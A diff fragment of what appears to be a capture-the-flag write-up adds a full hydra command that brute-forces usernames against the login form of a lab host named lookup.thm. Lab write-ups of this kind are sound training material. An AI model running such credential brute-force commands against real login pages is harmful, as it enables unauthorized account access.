@@ -250,7 +250,9 @@ Finished
 > [!note]
 > Looking online showed me two ways using hydra or burp suite so can use either so lets try Hydra for now:
 
-
+```
+hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -IV -t 64
+```
 
 
 
